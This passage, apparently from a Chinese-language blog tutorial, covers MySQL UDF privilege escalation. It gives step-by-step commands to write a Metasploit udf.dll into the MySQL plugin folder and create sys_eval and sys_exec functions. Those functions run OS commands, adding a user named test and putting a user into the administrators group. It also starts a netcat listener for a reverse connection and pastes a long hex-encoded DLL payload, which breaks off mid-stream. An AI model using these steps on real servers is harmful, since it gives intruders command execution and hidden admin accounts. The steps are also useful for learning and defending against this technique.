<li>掌握MySQL数据库的账户，拥有对MySQL的insert和delete权限，用来创建和抛弃函数</li>
<li>拥有可以将udf.dll写入相应目录的权限</li>
</ul>
<h3 id="思路过程"><a href="#思路过程" class="headerlink" title="思路过程"></a>思路过程</h3><p><strong>整理一下思路：</strong></p>
<ol>
<li>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）</li>
<li>从udf文件中引入自定义函数(user defined function)</li>
<li>执行自定义函数</li>
</ol>
<p><strong>MySQL信息</strong><br>版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>secure-file-priv</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;%secure%&#39;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows in set (0.09 sec)</span><br></pre></td></tr></table></figure>
<p>这个参数限制了MySQL的导出。</p>
<p>该参数为NULL时不允许导出、为空时允许在任意文件夹中导出、为路径时允许在该路径中导出。</p>
<p>使用load_file、dumpfile等函数时需要在my.ini中将secure-file-priv设为空，不是NULL。若文件中没有这个参数可以添加<code>secure-file-priv=&#39;&#39;</code>。</p>
<p><strong>上传udf文件</strong><br>下载地址：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank" rel="noopener" title="下载">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| @@version_compile_os | @@version_compile_machine |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| Win32                | AMD64                     |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>根据mysql的位数，我们这里选择的是32位的</p>
<p>将整个DLL文件以十六进制编码后写入磁盘。（注意windows环境下目录路径需要转义）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+------------------------------------+</span><br><span class="line">| @@plugin_dir                       |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>mysql5.1以上的版本是默认没有plugin目录的，网上有说可以使用ntfs数据流创建：</p>
<p><code>select &quot;test&quot; into dumpfile &#39;C:\\PHPStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#39;;</code><br>但是我在本地测试一直没成功，也不知道怎么回事</p>
<p>ps：自己手工创建了一个plugin。。。。。。。。。</p>
<p>我们将udf写到上述目录</p>
<p><code>select 0x十六进制内容 into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;</code></p>
<p>将udf文件转化为十六进制</p>
<p><code>select hex(load_file(&#39;lib_mysqludf_sys_32.dll文件路径&#39;)) into dumpfile &#39;xx.txt文件路径&#39;;</code></p>
<p>成功写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select  into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>load_file</strong><br>如果目标服务器已上传了我们的udf.dll，使用load_file写入到lib/plugin</p>
<p><code>select load_file(&#39;C:\\phpStudy\\PHPTutorial\\MySQL\\udf.dll&#39;) into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;</code></p>
<p>到这儿如果没有报错的话就说明已经在目标主机上成功生成了udf文件。下面要导入udf函数：</p>
<p><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;; //导入udf函数</code></p>
<p>导入成功的话就可以使用了：</p>
<p><code>SELECT sys_eval(&#39;ipconfig&#39;);  //返回网卡信息</code></p>
<h3 id="udf函数利用"><a href="#udf函数利用" class="headerlink" title="udf函数利用"></a>udf函数利用</h3><p>介绍一种最常用的函数sys_exec</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_exec returns string soname &#39;udf.dll&#39;;#导入该函数</span><br><span class="line">select sys_exec(&#39;net user test 123456 &#x2F;add&#39;);#创建test用户</span><br><span class="line">select sys_exec(&#39;net localgroup administrators xutest &#x2F;add&#39;); #提升到超级用户组</span><br><span class="line">drop function sys_exec;#删除该函数</span><br></pre></td></tr></table></figure>

<h2 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h2><p>实质是udf提权</p>
<p>先在另一台服务器上开启端口监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lv@ubuntu:~$ nc -vv -l -p 12345</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12345)</span><br></pre></td></tr></table></figure>

<p>上传udf.dll</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">set @a&#x3D;concat(&#39;&#39;,</span><br><span class="line">0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf8057156e5b593a7dc8058f05e2da4ca217cf5be8881e00fa9d1f7a618820a0f0b2ba6175dbca0b6f035bc24ebe83198b5a90ebde91e8954581da67159639f40f37210a1bd8bf14dc987fd37b1a5fe69bda234e6d7f70d9ca0531039f19fd054904eea5b7a52ec468e5345437d0737b1495dc7249ea4cfa6f48c2e3e6158d5f0f1efd1bafb4d7fe0b0dce7ad98e8d3f57bb708a8aea83a0eea3ddc00394dfcdfafd308b6b24fa20c7625d2fcd6a5fae7d273ec98eea794bfe979dc3123ffc32c197bdca6321b57785908e6d19ab6f536a8df7e1e05baded7a4ebc007766c508a13394f51803beea47fac0ed97c25ed9888ddc6dc6219e704c6a132cd04cff7447b2df742108d0272366b11b2c4767464b460251de4ce3ce6d193589d14aec9b97766a6883e4dbf1dca0edf32f8980ebf2f9c935dcc56fa6e0b29798ea458e6edc0af271e6814fa425548e41fc8f641b8ad487a20812e4eb25063746b3d4244b101031580a0119d649ca5f32a68b11e7d5741a5ad7682fa8fafbe5aff113269b9a47923f81d3a028615f8c6e7b38e78e443cb2a49d91c2a7757a99df35aaa71dfd21e0b5591af970e6d2f239ff7e2d76acd9967ad6fc30d460d552f1930461e9b86a92d358618fa3b539029603a3260fc65d57a5909e35777a633d9093911fc636bfe3745a7510cb4633092223f5315f6745a604ac0365abae8968b19677f840b1502e21b638ceffd5075b3d3688eab91379dfeed65beaa5f7ca5b971dbc53c6c000b259dea5d6fd84b2e12090331a45299d807d3c12545f84710d36168ca4f277c8fa3982806faef71d73860b58f8db7a3116af13418100c8e905651b538b5c1853fb194c574a918b8f0426152253ff3db5af8289080fe0d7bf2b9d907c54eb2604d8f4e3865d8c7e8659acd1928182206c0efad42664b6ef473f74d7a8d681273590a487f250c143bd18253c3df904b620f4203757b029d8b41bfbcb9ace3d5e7673386dab5e3e486a3f49bbf89f5a4c67e0c1067c0adf6bbdfa43cd6289c1e45e46fc4f236a708684f9461787a90f6fd9a1f55690bbb3ddfcb94d960c39f58110acd1a4538b6ae85b06e4024610575bc3069a2b90b07e01096854e1e8bd00260bd495f975c8543030031c6fbcd201bf384f27f72af8c9ce354ef66a27fbc04dc0bb34f7a67518575d78bcac95243f1743b0f843f7806d1b6278766e05e90694a328230b378516ece63e46180a0c2d3972674fa8de29c864198e66173bea93f54995bfaa4b1e8638ba111187e26161d23ddbaff9a1dde6c8601b6c1c5e0658a153685de38e7a92a39d34587d67d10da2d7a01e70ac5488b16d0002229154101f0d5f6afd6636f7e376a3d5842861f8c5642b81676a5a3dc14de9bfe1e3011cb9e4cdd6a1afa87e84f86ee792a090f48f9540a23eb0928cf8d9f52a44acba76c827494bb6ef8971f1690d441f0ba8322b5cb15ee105e95ab47f560ecef4d5046c75ded3523549b3a2a0c878906af9ef17bddb57d82a437932d9b6802cf178e34f9c4764054f01902258e7d2317b9a98e78bc273e406d6fd2d33c4270cfd4596fedec01c4f9e6216f73a71e930b208d247dceee69f0d1f55a179c70b69f71c0e8a8b4cfdd89cdb1908d6d96b33d98a26456f79f26c744f9f7508983324cc354c1f20f89480c8c506fa04f59cb8ae99f8bf4ae9ba8b06f6aa052b695aa5da8143eefda5b3a4d65b0333f944861d2d53503236151731f4b262d66597865ffebc3474f3566b56f4ba520e9fd933c304ef9ca43bd6336e9b82e0e76724c1820aa1bc231ae694cf759938c29c210cb676885a65b4ae212f4382788458ea9a136bfc9bfed6f159e0844c4db54a3bac68d95cc91623f7e1476f8f736c131097daf671157f18d67116a2d273fa9e53375955bb7bb6ecb3518e7f05dd9248a1e26607708ab2a67904c44325fbe219e04512da82e93d466fa33a7d00d70d1cd45d650f3bf001bd7a2d0ae1c545fb75fb6af69bbde85e358e272b26dd2ea189db0a41c1131ec3882d5b72e3a643e02527909758ba4bd542746b60d822b35884b828a12b683aa4abd4861f7a249bbc0dbc12559e88c2bce5bf5aa35c0b17c69794abbc5765e7eabca36ebfb7318998f974d42f3df2564e29abe38e7671d25702051346b86fa36f6b71dae27e7506e5a5a790658646ab672bb825857890107e837992ab33ad751963c155d5d85dbca61092accb9e38c4589db3487082068f2dfc818fe05f8ce8a18dfc6716e0466e87d79ad6bf1353b0a34be96416d0f44c44a9563fdbc2c093875a385ecfdc6e11a488964690333669e8dc714957e0e1b3ce29c2309bd17ccc74520cda658381385821f44137a3486a682fcefc2e111d8304264538a64e8acb6e791960342463f970c4d250e154f28b66a5a7011bf7942c04e053804c100e79a1cbc4278f689ab9a3bd4669928bcad4c165644b53695fc7910a2129a872e548de830ef3b7ee255e7b6480f06f9fd895e84e5b5e038ffc0389317e95a79dbe8c95c8b8bcaef5a524abd85da966e905d2db3946d56eee8f5006ce54eea02c035af841bdcf95509422fc24329e6a03bf6eafbefe5b6ffe19f45a63ceb73ef8bcb0ea9e3030d27c3d6a8ddd88b041dc47fb229431498262a8887785dd8657c055229dad916a71360aa931bd7e158b6c17e3a2d8cefd88f77e40ebbcfa4db96b89d6f51402d7e325a8e64fe1fab085568dc5f373bce2bd05b24eb60f87214fa162086d5521d39ee0eb565f86f338ff996e3fcf4a9dc36f3a32cdcc356eff69cc0f5bacea0f331494796d808168b83eeb8489c0f687052c709e7558005e7d34aa60424265cc8a656d065ca83b78ed51d0a2a6f1768c3048ade80275469ca6091a5720d56e36c1c5dc0f6fa344259d34c2324821ede5ce0ddf1b9d9132270a6c2ace863d258b5377f3dabd660a0c4d59278fa23f056d76b077812e7db036500bdd1bb333043ff1aa5267ed828ee5af9e4cdbdeea851f3234f93700e681f13b5eacb938e03851d4e80f319d5dc8e6439fa41475d6f133d131cebefe4db7f3a7c0b9d62511805373e2a5ccb637b81fd27fddf03eb72d74bf20b54e00a501acf1a61aba9d994055402d838b85930912630335e5b545c0058d9474e5ac355a5f630f8ae6e3860bf8a62798926179a3bc9c2e7264752ea7a0b45bb6053169504510e70a043d3efdc5af76a2e1df04c2a2b7cf96dff5e8f212510d9dfec01b425107c9c8fa7500637a27eff7bb7eb7935566bfaf5d37323def1740318875ba2e0cea9dd3ae9ab7d0bf74ad9fb7c87c91a62aafd80b8661f28d5148d92a4f8f80167b786751a40edca8b3de8c2bb05c7cd682865ac3493377cba23a4e1fea18299336e7533e38af3598acde9646c1d6164b3fa8059aaa522824f6ffb90c12b4827d0e0302153f2126201bb6b588875cab0d346a7dc8749654f503f01bd9a4e672a88104829417bfd2e344b435fd111ce7ff27b56c81b44c487df01e63f0ba70228ad76fa2b4e0d5a57d7f63827afc2328a3f6b679eb581c9247689baf8057fc892bf5b323f19091b085bfd1625d7458d8a8a8ba3248fe992fe9edb14dafe34355234271d9ceaf4e9e298c02743be6b5488a8e248baae788e793301078ebc3824424374a0624404d6ce2d268fcf0052a20125e71295eea2b0c395ecb2f4bc20efd7270e4b00f2a17de04a587c4e17bdbb07713f830be090c4200db5477f75e44c9714d4eee288e438fd3c6887e5b08ba6f2f015dc749871fed99ac7bb5d25de80ff396f0139c1a98ecf25971383068cd71083d9a3d11f73860372efeb266da459d9e3f49d7c6a47e034ba7d97142cc6183bdcd38b0881ae18061070e767f68835d8e51dd585dbb6597b8e66ea60a553d876bd355b83d2c1340385ecfacda26d65c744aa6d025dd393ec353778c0c24df4abce8f96006856ce322cc902aed08ad19ec4c01ea392ddd15ea0b6f25fab35cc314169c440e9552e5dcfbf02a7eb924c8f40e7299245d550ced955f57dda2b95770de0f80041384f26f075cf4eeb0b893f5a3844e9779b5ed0c83810f6ff31836f6c289a7bdfc95e9d452f931e6dad9252d97220485e59aea90fa8df84b17e993f1627ac66a7ce4920eb63fd7f27b0969e7e19fb83f8252623818cd78ca73414cbb5be0f242ed5fbe337fafb88cc3d203b5cbc73daef664635f7c9db24a6a7795ab7f2fec1d47cda394ca4367013911174e0a7949c6a8993483c76891b248803a5be67deed96cf301a14ab61246be742eb8e3a09d3c619ad9f3320ff53b99c2b6b2f41b009d629ce0df2494836158fbe4bf7e3460d88cb212c99a4decf3f9ccec071f494269d7bd570b5ea0fca07485e5326a4a6727e7e0c101375e4239535ee6b0d63a20c3c9bfc5d0dd9940348c3421673039371ae3074698e7167c70fc635ecb2daa207aaf4570043f2dadb1af007b930d979cc0da729baff0e077df062ad3f2bcbd4e9daebd96f90fe9946cd88eee0d72a9ed035af0bfceb843a2399468088a24d8b999403438fc99f0da8e4a91a939953ffaf7251ca3fd466ff2110afb33242e278c6b072f5ed3df4c1482d28722874f0b1f30226bf336699766333dc331abf7ec09466be15eceaa2bc8d6b21ba56d5e960b7b485466ac92f03b3ae98bdc441686e2d89975756dd922bde9f8760c6a9a21e046d9f38ad2477e5c11e306b7f335eb5bdc198c28a28139b4944f43cd22b6798e89ed772271a43f1c802db013d047977dfd98361a4ee89186dbfe61fbfa02432ac4645f0ded7e6ec07e82f102922c1917082529e3a364b43196e93c1ec6353a0f972165d63b2086e43d31c21e28136e72f338ffeea68bca8490d58227d435dcd2defed8ca49cf486ab29b7e776220e66c20636f1f551d54bae83b4996ec68d656f1a29b82d806f5498f29178f503919d517835f289d4b5f679d61c4f91522ed8ab502b544346ed3b3c2fc949a149a24a703aa524a38a233323a02fe5fd220884d708999f227cc27f800b6b00c4cae107def5b0cb9ca4336875662af9622231b38521463432c4b7ef837569efbad1fb7d6ca953e28d1d0e520b0c98fd74a424a6c06d41a60d7cd6e8ee721847acf03f996c371c321a83bf15d37c72aaa44b51bf5a7e8caf1c3787eee48aaf372f010931cff21682968b2033bf4809203203ec61566f96fcd2acd00172d91e9bfb5b8025652263281d985b316040ddef4aeac0f8e3542b41b76ff98b5d0303854aaa254c3a841867bb25c65fcbc2271814b525be74b3401b240fe5fa3ab12175af55366c7a839fa2c7ff59f85bf0b51943df5c12537ca78ae77c176c5e4002a87893a62c256f0c4f86778e4e059c0aa20e75bfc5c2835f4df0fcd7ac1171f49a8ce39ec5b6a2f69b995997dc62f7638c6e379846045e4a6ee0c1dfd162e2655b45769fa10e87bfd6b4a488477dd4f8e70cdbdbeeff66daa8715f286ac7a73506871cc21e4f7ef300b6c295c78c1b3e5d6031d7fb3be5b5635bdb92bf94c3f4e4335724182facaa37c5d65ff165913ff61cd8971d178a62444e45d6c92b19bc9a1b21febe3715a1f9f916aaab25910986da22c736954bfbf8b0c0281b1ef97b9851b12ff39d1ad97dbecde06fb708a588f4bc99dc5d52f1ab87407b40c1e06d23761e354a2dfde9324f64b7d3391c5d2857904a12965011bd2d1f5d6e5fadc4d4acd5605167f10172dfbdf466ef9f34fd1b5b290d426bb3c4c812de12616016c6dfed62615f522342a1157218cc54ecb2874a3fff11d97810c5d667413cf74008b6ba55cf547d7ad1e10930da17f15a7b9979dcdec0191f00fecc45a8321f0ec2c4c2abc963f8bdf34f3d05b8db7591880c0e36ea294ca4e483be57094addbf9edae51f8b0c97bf47861304e7b304f3591f1f2e6f2b287b3ce9e64fefad5e811725b9a41ea799735ac307790582e651e16020bcb3c4a4c34735b4c6527703674d5506d63e7a5a5511018dd34532ca896906e1b8c9dcfab3ae32e52727f9322ca39609cfbcf058e20920c673e7af34cc8f3450b3a52e16deb895cdb2e412d26b88b9c2837bcb7f82c9992cdbe9dea677a34e4d9c612cb2dcdbcc9a2eb11d77558410c483844a7a9cca54e1a2a2d74d131817dbbefa63405bbbe04c659868fe80cf240daf9c26eebdb898077e59114a226bcd0d8a24e2ededb73f18128661f5ed021b14ccd6c706ad72dd68614248496fda0e7428ac21269c6cdfd567800cf258f031de85d46a1dd9f962acc481085a1078e95f9a839d5c08e55c2652879d2c2506429689612ed4a6431b1e2302965b00f9ae4c6520f18711ee8e618d4dca0d4927b88381cc0d5fe9652f29a3e45faf1918a1663b0a117fc3ba17640c01d60b305d4aa89afc9a50517e78bd488b66c4bda8ed57e3ba56270478bebb4737580f1f77785cb60bfcdfe840e9053d3b5f06750adcfbfe713cb46a1df4b7a828a4f3c8117e208a7b3d8d934b408478101d29dba20493b57a443962e2969f3165a200fe6ded2692a029cb1f9c138e25c14903129b018eba648d93c2079a614dd03d948fdea6e877b748fff6a7d396bc58e096ca72a525cb67594841f95a99ea9351ccda548a7b7b2311ec672b27e535edac3c2bbeeec863b4ed848b53488189ab6bfea6bd376e5280f0f4f5a1d526fbcc91a97a3d21f044235d6bed56284c19c41f4cfa3f31598e7dcb31fa761e61a9bf57f19daa3ba5634e5a37cb7bddc6115d436f9b3a0e56fc0adbbc4b34e8c0e25643d7b9bdb32267f524b2965a37e5070db5fb5b612d249ec12960128f7980d700b2253a5fab0fea4aa9735144d640d7f25a34282a3517f2dfe39d595c4c68a525e1ed92ebbdc50798b5b62fa8a694e61af9db663f2f0f6bec86ec451fa0b08584c23feab9804dcaf95899fe80206103a841f88ffd663d3d475eb4633ff36702afad9eb4c8b666014d89c21eff0f1036b6fe2845d5e24870e45d61f89eb8ed87a70289500391151d89ed889cda7fff8575a19e9b824aa2b28a9ff22a7b603bc6c91bfdd38b01303c2fbcd51d62a5fd73db8305ff84d7436901d0c3b613b6bae8216d15e357181b6cccb325dcb1ec9e41f5282165e6333011ae090f9fe001a3a2d8f3e47c1fcbb651c0040ae1fd3a593934b8e838ad397ba115433dff9f55e62dae5d5f768cd6a5becb121aaa08cd3f1e83f4ac69eb191247573ecc66c6c9faa7dc5f97e3405dbf86a9211c9450c62218c5f14f3719b0a1ebb7e9128e8989070e8921eb4e0552339b34d02b2b80d12a966ab63562ec61688d46b3beacf361793d9f2df65024473dd785b8ad4a5b98fcd1385cd2cb78e01061d0e8e23b437022f42a2f8ea396b44c1abf35b644efacbb064345eaba265093eb75d6ff9371edce1d3eb1ecbb364c55db41e0287554af06ca4b0db4875a5d2c8f1aba69771790d792b06ac064a9d12854e2324a485ccf5a4fe6ad39c3a57ff30c8a83b341bbc69e9dbbb89530b2009a30b5bff3adf3505311dd291208d47edd288bcf6bbff26a2877254b4dceed90a3f7a4a5b2f7594f02e43e07b635a4ee8b182c4fef7282352a655bcb4e8d7fa68365712b23ad0bd600dc3d5f39af26290a4dd8564b68d1c985cef5434c461d8206bac6d7c0d1e55eab379c5a8b1c17eeeace75590c78bc63a59e3a72827c0584500ca48ccfc2a65e16b3527950ade1f945f1dc31044f0b56ffd1d372014a9b347d85d63d0efe03d1bd6ae0fc95d5703dddfa091098ea4b8228ec77fb6fa192c969343232c3ea5896d9a39503c528564d8babfebde7c85c9ba14aeae5c012c41a75450ee464298d6af1cdb03e44211d2c6796babec9d335446977aa552a51dfdf7d61cc8ba4ada1d5674321ba172aabcb7e82caa3e497923de2a466ca1e908b118b4dd07fa6fb40901f3d6e0d6af3dcbeb2b678e44899b8663f1e91cd00a32f21c407965aa89cc3d6a43b5d9a4472c756e6620a82f22fdeee5e4d416698f75dafb1f4e19b4114b65e4ef6de33348cc5292a67e598eb84edd47841ea6145ae1a9feda9d2a41983af77596a87083ab0c88e27bde0ba0cb96b5ec0641b2c7b82455e3b72013fe5112e3ca8657e5a785fe8bf5fc2d2073bd75910a12215949867c1fd5a9639f6aa9640bbbc7e59194bd165dea0402f949e8baad329f46fa16cef4390faf9b7111e2575fe16e1b76639ca0079afbdd03741aa148754ad5d7dde6b4321ee295003a0b23001a2cdf27f263a71876958295fe9b3721c1f04ea2eebbe98bddd7f0af338a88b9bd57dc88710d28f573e2a2d905d713af99d492c129b2d539277d7418b1d357a74adbe27585c25bd2c16c9f39f66ced1f5472f2da1b92c195b5aa84737c1c51a7a1bde1344bae614912654ef6643e3d820b121dd2631cb6d497aa826c4eb79dc98c6b8a9bac431659610a6c7d1511a6fda5b7769c847b59052f072b2af69d47efca50f39afad47158ba81fe287d725d07003bb58f0ecdf7467992f63b6e413b932d70aae0930e0f1ff762f3d004526d89a388c690a20b949f574d6c248d6ab42696437dcfbc9fefeeb40742dd3c10d2f5f22c05e8e7c0fabbfa12aaf186a79b47f3c7e0cbcc2d0152ff2aea736096537a3c9c1f936ba96bb64733907701efd65a619c788b589a7f15702bcf2f0af62857b9f8a7e343156ed3e483fd08f34957354daeed6827c67b34f6b3461dfdb2bd3c8d390fb31930c3822fb7f694a22f3239d012f706dabff10b03f0e66869be4a435eff24469dac80754839d8933e1e781b965826eb53c47fc53bc2a85386cce1dd07fed6dc16390562ba8362bdc541919893cc2ccbf5565ba3b37166a31221de542d5b11ef0381d32e8ed8a4c8789a219721f821b38e2106cda68c2c6d2088fa5b3d1b9c2f8c543ef40555d9f667186fefef64b54dbae5a906dad48cd02e0fdb4500aa492e7efc6d5698dce363563bbd606179dc7821b9a736c31f39def29f10e40dafdc52d29b591178223b5e84f1983dd54a62981d8eab5b674d80c70627135ad90c1bcbdc2a9bdc926653cd56078eda264b9c9226fc4c9b549fc4cf73cdd41a7c26616755e7f8a1450f5236d1ba0c378188ae71d5344eadf7d04dfc122af44d59e9c263a258739c34082d88c0760ed5067baabd00485a3339e19afa4ffca023ac57c936fa78b1c7c04dc0d94f2542dfabb0f3ac3a7536d7d1384edf06729ff08eba1b7a7f5dd3f78f154f51f6092db8dbb91f8d0ea81065f4d0c431276a68f416022be7efa82d735613025c3f593c7d57b15643be8ad7126102ace4ec9a82b32b3ca4ca9140aec4d9f0172c7e7dcb22fd06e0b9d3bb1ae41b5c8a7d35e043e75f30eef7c0abd7d10bbe23847dab51b9031fc61f1f8a05cf395970d66d2193de952644efd0da226dc1858df23950e1d871d93ce5d1008e5dba83545a24ca5fc3012e126fa3950b6ece8849d4ab945583614e3b2afebd234049766b6e735956e93fddc17911129ae13b